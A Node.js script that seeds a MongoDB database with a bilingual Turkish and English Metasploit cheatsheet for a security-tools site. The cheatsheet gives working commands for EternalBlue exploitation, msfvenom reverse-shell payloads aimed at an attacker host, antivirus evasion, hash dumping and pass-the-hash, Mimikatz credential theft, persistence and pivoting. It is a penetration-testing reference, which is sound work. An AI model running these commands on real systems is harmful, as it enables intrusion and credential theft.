import dbConnect from '../lib/dbConnect.js';
import Cheatsheet from '../models/Cheatsheet.js';
import Category from '../models/Category.js';
import mongoose from 'mongoose';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load .env.local
const envPath = path.join(__dirname, '..', '.env.local');
if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf-8').split(/\r?\n/);
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const idx = trimmed.indexOf('=');
        if (idx === -1) continue;
        const key = trimmed.slice(0, idx).trim();
        const val = trimmed.slice(idx + 1).trim();
        if (key && !(key in process.env)) process.env[key] = val;
    }
}

const contentTR = `# Metasploit Framework - Penetration Testing Framework

## 3. Temel Kullanım

**msfconsole başlatma:**
\`\`\`bash
msfconsole -q
\`\`\`
→ **-q**: Banner'ı gizleyerek sessiz modda başlatır (quiet).

**Modül arama:**
\`\`\`bash
search type:exploit platform:windows smb
\`\`\`
→ **search**: Modül veritabanında arama yapar.

**Exploit seçme:**
\`\`\`bash
use exploit/windows/smb/ms17_010_eternalblue
\`\`\`
→ **use**: Belirtilen modülü aktif hale getirir.

**Payload seçme:**
\`\`\`bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
\`\`\`
→ **set PAYLOAD**: Exploit ile kullanılacak payload'u belirler.

**Auxiliary modüller:**
\`\`\`bash
use auxiliary/scanner/smb/smb_version
\`\`\`
→ **auxiliary**: Tarama, fuzzer ve sniffing gibi exploit dışı modüller.

**Scanner modülleri:**
\`\`\`bash
use auxiliary/scanner/portscan/tcp
\`\`\`
→ **scanner**: Ağ tarama işlemleri için kullanılan modüller.

**Options inceleme:**
\`\`\`bash
show options
\`\`\`
→ **show options**: Modülün gerektirdiği parametreleri listeler.

**Exploit çalıştırma:**
\`\`\`bash
exploit -j
\`\`\`
→ **-j**: İşlemi arka planda (job olarak) başlatır.

**Session yönetimi (meterpreter, shell):**
\`\`\`bash
sessions -i 1
\`\`\`
→ **sessions -i**: ID'si verilen oturuma (session) bağlanır.

**Background session:**
\`\`\`bash
background
\`\`\`
→ **background**: Aktif oturumu arka plana atar.

**Loot / creds görüntüleme:**
\`\`\`bash
creds
\`\`\`
→ **creds**: Toplanan kullanıcı adı ve şifreleri listeler.

## 4. İleri Seviye Kullanım

### Metasploit Modül Yapısı
*   **Exploit**: Hedef sistemdeki bir zafiyeti kullanarak kod çalıştırmayı sağlar.
*   **Auxiliary**: Bilgi toplama, tarama ve DoS gibi saldırı dışı işlemler.
*   **Post**: Ele geçirilen sistemde (post-exploitation) bilgi toplama ve yetki yükseltme.
*   **Payload**: Exploit sonrası çalışacak kod (shell, meterpreter vb.).
    *   **Staged**: Küçük bir başlatıcı (stager) gönderir, asıl payload'u sonradan çeker (örn: \`reverse_tcp\`).
    *   **Stageless**: Tüm kodu tek seferde gönderir (örn: \`reverse_tcp_rc4\`).
*   **Encoder**: Payload'u encode ederek (şifreleyerek) AV/IDS atlatmaya çalışır (örn: \`shikata_ga_nai\`).
*   **Nops**: No Operation (NOP) sled'leri, buffer overflow exploitlerinde payload'un güvenli çalışmasını sağlar.

### Payload Mimarisinin Derin Analizi
*   **reverse_tcp**: Hedef, saldırgana TCP bağlantısı açar. En stabil olanıdır.
*   **reverse_http / reverse_https**: HTTP/S trafiği gibi görünerek firewall'ları atlatır.
*   **Staged vs Stageless**: Staged payloadlar bellek kısıtlamalarında iyidir ancak ağ trafiğinde daha çok gürültü yapar. Stageless payloadlar daha büyüktür ancak tek bağlantıda işi bitirir.
*   **AV Evasion**: Encoder kullanımı (örn: \`x86/shikata_ga_nai\`) imza tabanlı AV'leri atlatabilir ancak modern EDR'lar davranış analizi yapar.
*   **Config Tuning**: \`LHOST\` (saldırgan IP), \`LPORT\` (dinleme portu), \`EXITFUNC\` (payload bitince process'in ne yapacağı - thread/process).

### Pivoting ve Lateral Movement
*   **route add**: Meterpreter oturumu üzerinden iç ağa rota ekler.
    \`\`\`bash
    route add 10.10.10.0 255.255.255.0 1
    \`\`\`
*   **socks proxy**: Metasploit üzerinden SOCKS4a/5 proxy açarak diğer araçların (nmap, burp) tünellenmesini sağlar (\`auxiliary/server/socks_proxy\`).
*   **meterpreter portfwd**: Yerel portu hedef ağdaki bir porta yönlendirir.
    \`\`\`bash
    portfwd add -l 3389 -p 3389 -r 10.10.10.5
    \`\`\`
*   **Internal Network Scanning**: Rota eklendikten sonra \`auxiliary/scanner/...\` modülleri ile iç ağ taranabilir.

### Post-Exploitation Teknikleri
*   **hashdump**: SAM veritabanından NTLM hashlerini çeker.
*   **mimikatz / kiwishell**: Bellekten (LSASS) açık metin şifreleri ve Kerberos biletlerini çeker (\`load kiwi\`).
*   **token impersonation**: Başka bir kullanıcının (örn: SYSTEM) token'ını çalarak yetki yükseltir (\`load incognito\`).
*   **UAC bypass**: User Account Control'ü atlatarak yüksek yetkili process başlatır.
*   **process migration**: Payload'u daha stabil veya gizli bir process'e (örn: explorer.exe) taşır (\`migrate PID\`).
*   **Privilege Escalation**: \`post/multi/recon/local_exploit_suggester\` ile olası yetki yükseltme exploitlerini bulur.
*   **Persistence**: Sisteme kalıcı arka kapı (registry, service, schtasks) yerleştirir.

### Service & Protocol Exploitation
*   **SMB**: EternalBlue, SMBGhost, PsExec.
*   **RDP**: BlueKeep, zayıf şifre denemeleri.
*   **SSH**: Libssh auth bypass, brute-force.
*   **HTTP**: Web uygulama zafiyetleri (Drupal, Struts, Jenkins).
*   **MSSQL**: xp_cmdshell ile komut çalıştırma.
*   **WinRM**: Windows Remote Management üzerinden komut çalıştırma.

### Database Entegrasyonu
*   **workspace**: Farklı projeler/hedefler için çalışma alanları oluşturur.
*   **creds**: Elde edilen kimlik bilgilerini saklar.
*   **hosts / services**: Taranan host ve servisleri veritabanında tutar.
*   **vulns**: Tespit edilen zafiyetleri kaydeder.

### MSFvenom Derin Kullanım
*   **Format Seçimi**: Hedefe uygun format (exe, elf, apk, war, asp, psh).
*   **Encryption & Encoding**: \`--encrypt rc4 --encrypt-key secret\` ile payload şifreleme.
*   **Template Injection**: Zararsız bir dosyanın (örn: calc.exe) içine payload gömme (\`-x\`).
*   **Badchars**: Exploit'i bozacak karakterleri (örn: \\x00) filtreleme (\`-b\`).

## 5. Açıklamalı Komutlar (GENİŞ LİSTE)

**Komut:**
\`\`\`bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
\`\`\`
**Açıklama:**
Metasploit'i başlatır ve tek satırda bir listener (dinleyici) kurar.

**Argüman Açıklamaları:**
*   **-x**: Başlangıçta çalıştırılacak komutları belirtir.
*   **use**: Modül seçer.
*   **set**: Değişken atar.
*   **run**: Modülü çalıştırır.

**Temel Metasploit Komutları:**
*   **search**: Modül arama (örn: \`search eternalblue\`).
*   **use**: Modül yükleme (örn: \`use exploit/...\`).
*   **set**: Option belirleme (örn: \`set RHOSTS 10.0.0.1\`).
*   **unset**: Option kaldırma.
*   **show options**: Tüm seçenekleri göster.
*   **show payloads**: Uyumlu payload listesi.
*   **exploit / run**: Modülü çalıştırma.
*   **sessions**: Aktif session listesi.
*   **sessions -i**: Session içine girme.
*   **jobs**: Background job listesi.
*   **check**: Vulnerability check modu (exploit etmeden kontrol).

**Payload / Exploit Argümanları:**
*   **LHOST**: Dinlenecek arayüz (Saldırgan IP).
*   **LPORT**: Dinlenecek port.
*   **RHOSTS**: Hedef IP veya IP aralığı.
*   **RPORT**: Hedef port.
*   **TARGET**: Exploit için hedef profil (işletim sistemi versiyonu vb.).
*   **PAYLOAD**: Payload seçimi.
*   **DisablePayloadHandler**: Dış handler kullanımı (Metasploit listener açmaz).

**MSFVenom Argümanları:**
*   **-p**: Payload seçimi.
*   **-f**: Çıktı formatı (exe, raw, elf...).
*   **-a**: Mimari (x86, x64).
*   **--platform**: Platform seçimi (windows, linux...).
*   **-b**: Badchars (kötü karakterler).
*   **-e**: Encoder seçimi.
*   **-i**: Encode iterations (tekrar sayısı).
*   **-o**: Çıktı dosyası.
*   **-x**: Template inject (şablon dosya).
*   **--smallest**: En küçük payload üretme.

## 6. Gerçek Pentest Senaryoları

**SMB Exploit (EternalBlue):**
\`\`\`bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
\`\`\`
Windows SMB zafiyetini kullanarak SYSTEM yetkisinde oturum açar.

**Web Application Auxiliary Enumeration:**
\`\`\`bash
use auxiliary/scanner/http/title
set RHOSTS 192.168.1.0/24
run
\`\`\`
Ağdaki web sunucularının başlıklarını (title) tarar.

**SSH Brute-force:**
\`\`\`bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
\`\`\`
SSH servisine kaba kuvvet saldırısı yapar.

**MSSQL Login Brute-force + xp_cmdshell:**
\`\`\`bash
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.10
run
# Başarılı olursa:
use exploit/windows/mssql/mssql_payload
\`\`\`
MSSQL şifresini bulur ve xp_cmdshell ile kod çalıştırır.

**Reverse Shell Alma (MSFvenom):**
\`\`\`bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
\`\`\`
Linux için reverse shell payload'u üretir.

**AV Bypass Payload Üretimi:**
\`\`\`bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o bypass.exe
\`\`\`
Payload'u 10 kez encode ederek AV atlatmaya çalışır.

**Windows Privilege Escalation:**
\`\`\`bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
\`\`\`
Oturum açılan sistemde yetki yükseltme açıklarını arar.

**NTLM Hash Dump ve Pass-the-Hash:**
\`\`\`bash
hashdump
# Hash elde edildikten sonra:
use exploit/windows/smb/psexec
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
\`\`\`
Hashleri çeker ve şifre olmadan hash ile giriş yapar.

**Domain Controller Lateral Movement:**
\`\`\`bash
load kiwi
creds_all
\`\`\`
Mimikatz ile domain admin şifrelerini bellekten çeker.

**VLAN Pivoting:**
\`\`\`bash
run autoroute -s 10.20.20.0/24
use auxiliary/scanner/portscan/tcp
\`\`\`
Ele geçirilen makine üzerinden diğer VLAN'ı tarar.

## 8. Best Practices (Uzman Seviye)

*   **Doğru Payload Seçimi:** Firewall varsa \`reverse_https\`, yoksa \`reverse_tcp\` kullanın. Bind shell sadece direkt erişim varsa uygundur.
*   **AV/EDR Bypass:** Sadece encoder yetmez; encryption, stageless payload ve custom template (\`-x\`) kombinasyonları kullanın.
*   **Staged Payload Riskleri:** Stager ağda yakalanabilir, mümkünse stageless kullanın.
*   **Firewall Egress Filtering:** Yaygın portları (80, 443, 53) kullanarak dışarı çıkış kısıtlamalarını aşın.
*   **Low-profile Exploitation:** \`check\` komutu ile exploit etmeden önce zafiyeti doğrulayın.
*   **Pivoting Rota Yönetimi:** Karışık ağlarda \`route print\` ile rotaları sürekli kontrol edin.
*   **Session Hijacking:** \`steal_token\` ile yetkili process'lerin kimliğine bürünün.
*   **MSF Database Workflow:** \`db_nmap\` kullanarak tarama sonuçlarını doğrudan veritabanına aktarın.
*   **Log İz Bırakmayan Exploitation:** Disk yerine bellekte çalışan (in-memory) teknikleri tercih edin (örn: PowerShell injection).
*   **Payload Boyut Optimizasyonu:** Buffer overflow exploitlerinde \`--smallest\` ve badchar optimizasyonu yapın.

## 9. Sık Yapılan Hatalar

*   **Staged Payload Yanlış Kullanımı:** Stager ile stage uyumsuzluğu (x86 stager -> x64 stage).
*   **LHOST/LPORT Yanlış Ayarı:** NAT arkasındaysanız LHOST yerel IP değil, dış IP olmalıdır (port forwarding ile).
*   **Firewall Egress Filtering'i Hesaba Katmamak:** 4444 portu genellikle engellenir, 443 veya 80 kullanın.
*   **Target Profile Yanlış Seçmek:** Exploit hedef işletim sistemi versiyonuna tam uymalıdır.
*   **Timeout Düşük Bırakmak:** Yavaş ağlarda exploit zaman aşımına uğrayabilir.
*   **AV/EDR Tarafından Engellenen Payload Formatı:** Ham .exe dosyaları hemen yakalanır, obfuscation şarttır.
*   **Multi/Handler Yanlış Konfigürasyonu:** Handler payload'u ile üretilen payload birebir aynı olmalıdır.
*   **Background Job'ların Yönetilmemesi:** Çok fazla açık job sistemi yorabilir.
*   **Post-Exploitation Sırasında Yanlış Process Migration:** Stabil olmayan bir process'e geçmek oturumu düşürür (örn: kapanan bir uygulama).
*   **Yanlış Route Add ile Pivoting Başarısızlığı:** Yanlış subnet maskesi veya session ID.
`;

const contentEN = `# Metasploit Framework - Penetration Testing Framework

## 3. Basic Usage

**Starting msfconsole:**
\`\`\`bash
msfconsole -q
\`\`\`
→ **-q**: Starts in quiet mode (hides banner).

**Searching for modules:**
\`\`\`bash
search type:exploit platform:windows smb
\`\`\`
→ **search**: Searches the module database.

**Selecting an exploit:**
\`\`\`bash
use exploit/windows/smb/ms17_010_eternalblue
\`\`\`
→ **use**: Activates the specified module.

**Selecting a payload:**
\`\`\`bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
\`\`\`
→ **set PAYLOAD**: Sets the payload to be used with the exploit.

**Auxiliary modules:**
\`\`\`bash
use auxiliary/scanner/smb/smb_version
\`\`\`
→ **auxiliary**: Non-exploit modules like scanning, fuzzing, and sniffing.

**Scanner modules:**
\`\`\`bash
use auxiliary/scanner/portscan/tcp
\`\`\`
→ **scanner**: Modules used for network scanning tasks.

**Inspecting options:**
\`\`\`bash
show options
\`\`\`
→ **show options**: Lists the parameters required by the module.

**Running an exploit:**
\`\`\`bash
exploit -j
\`\`\`
→ **-j**: Starts the operation in the background (as a job).

**Session management (meterpreter, shell):**
\`\`\`bash
sessions -i 1
\`\`\`
→ **sessions -i**: Connects to the session with the given ID.

**Background session:**
\`\`\`bash
background
\`\`\`
→ **background**: Sends the active session to the background.

**Viewing loot / creds:**
\`\`\`bash
creds
\`\`\`
→ **creds**: Lists collected usernames and passwords.

## 4. Advanced Usage

### Metasploit Module Structure
*   **Exploit**: Code that takes advantage of a vulnerability to execute code.
*   **Auxiliary**: Non-attack operations like information gathering, scanning, and DoS.
*   **Post**: Information gathering and privilege escalation on a compromised system (post-exploitation).
*   **Payload**: Code that runs after exploitation (shell, meterpreter, etc.).
    *   **Staged**: Sends a small launcher (stager) first, then pulls the main payload (e.g., \`reverse_tcp\`).
    *   **Stageless**: Sends the entire code at once (e.g., \`reverse_tcp_rc4\`).
*   **Encoder**: Encodes the payload to attempt AV/IDS evasion (e.g., \`shikata_ga_nai\`).
*   **Nops**: No Operation (NOP) sleds, ensure safe payload execution in buffer overflow exploits.

### Deep Analysis of Payload Architecture
*   **reverse_tcp**: Target opens a TCP connection to attacker. Most stable.
*   **reverse_http / reverse_https**: Looks like HTTP/S traffic to bypass firewalls.
*   **Staged vs Stageless**: Staged is good for memory constraints but noisier on the network. Stageless is larger but completes in a single connection.
*   **AV Evasion**: Using encoders (e.g., \`x86/shikata_ga_nai\`) can bypass signature-based AVs, but modern EDRs perform behavioral analysis.
*   **Config Tuning**: \`LHOST\` (attacker IP), \`LPORT\` (listening port), \`EXITFUNC\` (what the process does when payload finishes - thread/process).

### Pivoting and Lateral Movement
*   **route add**: Adds a route to the internal network via a Meterpreter session.
    \`\`\`bash
    route add 10.10.10.0 255.255.255.0 1
    \`\`\`
*   **socks proxy**: Opens a SOCKS4a/5 proxy via Metasploit to tunnel other tools (nmap, burp) (\`auxiliary/server/socks_proxy\`).
*   **meterpreter portfwd**: Forwards a local port to a port on the target network.
    \`\`\`bash
    portfwd add -l 3389 -p 3389 -r 10.10.10.5
    \`\`\`
*   **Internal Network Scanning**: After adding a route, \`auxiliary/scanner/...\` modules can scan the internal network.

### Post-Exploitation Techniques
*   **hashdump**: Dumps NTLM hashes from the SAM database.
*   **mimikatz / kiwishell**: Extracts plaintext passwords and Kerberos tickets from memory (LSASS) (\`load kiwi\`).
*   **token impersonation**: Steals another user's (e.g., SYSTEM) token to escalate privileges (\`load incognito\`).
*   **UAC bypass**: Bypasses User Account Control to start a high-privilege process.
*   **process migration**: Moves the payload to a more stable or hidden process (e.g., explorer.exe) (\`migrate PID\`).
*   **Privilege Escalation**: Finds potential privilege escalation exploits with \`post/multi/recon/local_exploit_suggester\`.
*   **Persistence**: Installs a permanent backdoor (registry, service, schtasks) on the system.

### Service & Protocol Exploitation
*   **SMB**: EternalBlue, SMBGhost, PsExec.
*   **RDP**: BlueKeep, weak password attempts.
*   **SSH**: Libssh auth bypass, brute-force.
*   **HTTP**: Web application vulnerabilities (Drupal, Struts, Jenkins).
*   **MSSQL**: Command execution via xp_cmdshell.
*   **WinRM**: Command execution via Windows Remote Management.

### Database Integration
*   **workspace**: Creates workspaces for different projects/targets.
*   **creds**: Stores obtained credentials.
*   **hosts / services**: Keeps track of scanned hosts and services.
*   **vulns**: Records detected vulnerabilities.

### MSFvenom Deep Usage
*   **Format Selection**: Format suitable for the target (exe, elf, apk, war, asp, psh).
*   **Encryption & Encoding**: Payload encryption with \`--encrypt rc4 --encrypt-key secret\`.
*   **Template Injection**: Embedding payload into a harmless file (e.g., calc.exe) (\`-x\`).
*   **Badchars**: Filtering characters that would break the exploit (e.g., \\x00) (\`-b\`).

## 5. Annotated Commands (EXTENDED LIST)

**Command:**
\`\`\`bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
\`\`\`
**Description:**
Starts Metasploit and sets up a listener in a single line.

**Argument Explanations:**
*   **-x**: Specifies commands to run at startup.
*   **use**: Selects a module.
*   **set**: Sets a variable.
*   **run**: Runs the module.

**Basic Metasploit Commands:**
*   **search**: Search for modules (e.g., \`search eternalblue\`).
*   **use**: Load a module (e.g., \`use exploit/...\`).
*   **set**: Set an option (e.g., \`set RHOSTS 10.0.0.1\`).
*   **unset**: Unset an option.
*   **show options**: Show all options.
*   **show payloads**: List compatible payloads.
*   **exploit / run**: Run the module.
*   **sessions**: List active sessions.
*   **sessions -i**: Interact with a session.
*   **jobs**: List background jobs.
*   **check**: Vulnerability check mode (check without exploiting).

**Payload / Exploit Arguments:**
*   **LHOST**: Listening interface (Attacker IP).
*   **LPORT**: Listening port.
*   **RHOSTS**: Target IP or IP range.
*   **RPORT**: Target port.
*   **TARGET**: Target profile for exploit (OS version etc.).
*   **PAYLOAD**: Payload selection.
*   **DisablePayloadHandler**: Use external handler (Metasploit won't open a listener).

**MSFVenom Arguments:**
*   **-p**: Payload selection.
*   **-f**: Output format (exe, raw, elf...).
*   **-a**: Architecture (x86, x64).
*   **--platform**: Platform selection (windows, linux...).
*   **-b**: Badchars (bad characters).
*   **-e**: Encoder selection.
*   **-i**: Encode iterations.
*   **-o**: Output file.
*   **-x**: Template inject (template file).
*   **--smallest**: Generate smallest possible payload.

## 6. Real Pentest Scenarios

**SMB Exploit (EternalBlue):**
\`\`\`bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
\`\`\`
Exploits Windows SMB vulnerability to get a SYSTEM session.

**Web Application Auxiliary Enumeration:**
\`\`\`bash
use auxiliary/scanner/http/title
set RHOSTS 192.168.1.0/24
run
\`\`\`
Scans titles of web servers in the network.

**SSH Brute-force:**
\`\`\`bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
\`\`\`
Performs a brute-force attack on SSH service.

**MSSQL Login Brute-force + xp_cmdshell:**
\`\`\`bash
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.10
run
# If successful:
use exploit/windows/mssql/mssql_payload
\`\`\`
Finds MSSQL password and executes code via xp_cmdshell.

**Getting Reverse Shell (MSFvenom):**
\`\`\`bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
\`\`\`
Generates a reverse shell payload for Linux.

**AV Bypass Payload Generation:**
\`\`\`bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o bypass.exe
\`\`\`
Encodes payload 10 times to attempt AV evasion.

**Windows Privilege Escalation:**
\`\`\`bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
\`\`\`
Searches for privilege escalation vulnerabilities on the compromised system.

**NTLM Hash Dump and Pass-the-Hash:**
\`\`\`bash
hashdump
# After obtaining hash:
use exploit/windows/smb/psexec
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
\`\`\`
Dumps hashes and logs in using the hash without a password.

**Domain Controller Lateral Movement:**
\`\`\`bash
load kiwi
creds_all
\`\`\`
Extracts domain admin passwords from memory using Mimikatz.

**VLAN Pivoting:**
\`\`\`bash
run autoroute -s 10.20.20.0/24
use auxiliary/scanner/portscan/tcp
\`\`\`
Scans another VLAN via the compromised machine.

## 8. Best Practices (Expert Level)

*   **Correct Payload Selection:** Use \`reverse_https\` if firewall exists, \`reverse_tcp\` if not. Bind shell is only suitable for direct access.
*   **AV/EDR Bypass:** Encoder alone is not enough; use combinations of encryption, stageless payload, and custom templates (\`-x\`).
*   **Staged Payload Risks:** Stagers can be caught on the network, use stageless if possible.
*   **Firewall Egress Filtering:** Use common ports (80, 443, 53) to bypass outbound restrictions.
*   **Low-profile Exploitation:** Verify vulnerability with \`check\` command before exploiting.
*   **Pivoting Route Management:** Constantly check routes with \`route print\` in complex networks.
*   **Session Hijacking:** Impersonate privileged processes with \`steal_token\`.
*   **MSF Database Workflow:** Import scan results directly into the database using \`db_nmap\`.
*   **Log-less Exploitation:** Prefer in-memory techniques (e.g., PowerShell injection) over disk-based ones.
*   **Payload Size Optimization:** Use \`--smallest\` and badchar optimization for buffer overflow exploits.

## 9. Common Mistakes

*   **Wrong Staged Payload Usage:** Mismatch between stager and stage (x86 stager -> x64 stage).
*   **Wrong LHOST/LPORT Setting:** If behind NAT, LHOST must be the external IP (with port forwarding), not local IP.
*   **Ignoring Firewall Egress Filtering:** Port 4444 is usually blocked, use 443 or 80.
*   **Wrong Target Profile Selection:** Exploit must match the target OS version exactly.
*   **Leaving Timeout Low:** Exploit might time out on slow networks.
*   **Payload Format Blocked by AV/EDR:** Raw .exe files are caught immediately, obfuscation is mandatory.
*   **Wrong Multi/Handler Configuration:** Handler payload must match the generated payload exactly.
*   **Unmanaged Background Jobs:** Too many open jobs can strain the system.
*   **Wrong Process Migration During Post-Exploitation:** Migrating to an unstable process drops the session (e.g., a closing app).
*   **Pivoting Failure due to Wrong Route Add:** Incorrect subnet mask or session ID.
`;

async function addMetasploit() {
    try {
        await dbConnect();
        console.log('Connected to DB. Adding Metasploit cheatsheet...');

        // 1. Find or create the category
        let category = await Category.findOne({ 'name.en': 'Exploitation' });
        if (!category) {
            console.log('Category "Exploitation" not found, creating...');
            category = await Category.create({
                name: { tr: 'İstismar (Exploitation)', en: 'Exploitation' },
                description: { tr: 'Sistem istismar ve exploit araçları', en: 'System exploitation and exploit tools' },
                slug: 'exploitation',
                icon: 'Bomb'
            });
        }

        const cheatsheetData = {
            title: {
                tr: 'Metasploit Framework',
                en: 'Metasploit Framework'
            },
            description: {
                tr: contentTR,
                en: contentEN
            },
            category: category._id,
            tags: ['exploit', 'framework', 'payload', 'meterpreter', 'pivoting', 'ruby']
        };

        // Upsert the cheatsheet
        const result = await Cheatsheet.findOneAndUpdate(
            { 'title.en': 'Metasploit Framework' },
            cheatsheetData,
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        console.log('Metasploit cheatsheet added/updated successfully:', result.title);

    } catch (error) {
        console.error('Error:', error);
    } finally {
        await mongoose.disconnect();
    }
}

addMetasploit();
